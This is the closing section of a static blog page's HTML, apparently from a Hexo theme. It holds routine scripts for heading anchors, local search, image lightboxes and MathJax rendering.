    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>



  

  
    <!-- MathJax -->
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
          tex2jax: {
              inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
              processEscapes: true,
              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
          }
      });

      MathJax.Hub.Queue(function() {
          var all = MathJax.Hub.getAllJax(), i;
          for(i=0; i < all.length; i += 1) {
              all[i].SourceElement().parentNode.className += ' has-jax';
          }
      });

    </script>

    <script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->

  










</body>
</html>
